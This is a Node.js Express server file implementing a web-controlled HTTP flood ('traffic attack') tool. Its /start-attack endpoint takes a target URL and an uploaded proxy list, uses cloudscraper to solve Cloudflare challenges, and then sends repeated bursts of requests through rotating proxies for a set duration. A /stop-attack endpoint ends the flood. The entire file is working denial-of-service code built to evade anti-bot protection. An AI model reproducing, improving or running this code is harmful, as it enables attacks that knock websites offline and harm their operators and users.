const express = require('express');
const bodyParser = require('body-parser');
const CloudScraper = require('cloudscraper');
const multer = require('multer');

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Set up multer for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

let attackInterval;

app.post('/start-attack', upload.single('proxy'), async (req, res) => {
  const { url, delay, count, duration } = req.body;
  const proxyFile = req.file;

  const target = url.trim();
  const attackDelay = parseInt(delay, 10) * 1000;
  const requestsPerIp = parseInt(count, 10);
  const attackDuration = parseInt(duration, 10) * 1000;

  let proxies = [];

  if (proxyFile) {
    proxies = proxyFile.buffer.toString().split('\n').filter(Boolean);
  }

  function sendRequest() {
    let proxy;

    if (proxies.length > 0) {
      proxy = proxies[Math.floor(Math.random() * proxies.length)];
    }

    const getHeaders = new Promise((resolve, reject) => {
      CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: proxy ? 'http://' + proxy : undefined,
        challengesToSolve: 10
      }, (error, response) => {
        if (error) {
          if (proxy) {
            const objIndex = proxies.indexOf(proxy);
            proxies.splice(objIndex, 1);
          }

          const errorMessage = 'Error: ' + error.message;
          console.log(errorMessage);
          sendToClients(errorMessage);
        } else {
          resolve(response.request.headers);
        }
      });
    });

    getHeaders.then((result) => {
      for (let i = 0; i < requestsPerIp; ++i) {
        CloudScraper({
          uri: target,
          headers: result,
          proxy: proxy ? 'http://' + proxy : undefined,
          followAllRedirects: false
        }, (error, response) => {
          if (error) {
            const errorMessage = 'Error: ' + error.message;
            console.log(errorMessage);
            sendToClients(errorMessage);
          } else {
            const message = `Request ${i + 1}: Status Code - ${response.statusCode}`;
            console.log(message);
            sendToClients(message);
          }
        });
      }
    });
  }

  attackInterval = setInterval(() => {
    sendRequest();
  }, attackDelay);

  setTimeout(() => {
    clearInterval(attackInterval);
    console.log('Attack ended.');
    sendToClients('Traffic attack ended.');
  }, attackDuration);

  res.send('Traffic attack initiated.');
});

app.post('/stop-attack', (req, res) => {
  clearInterval(attackInterval);
  console.log('Attack stopped.');
  sendToClients('Traffic attack stopped.');
  res.send('Traffic attack stopped.');
});

function sendToClients(message) {
  // Implement WebSocket logic if needed for real-time updates
}

module.exports = app;
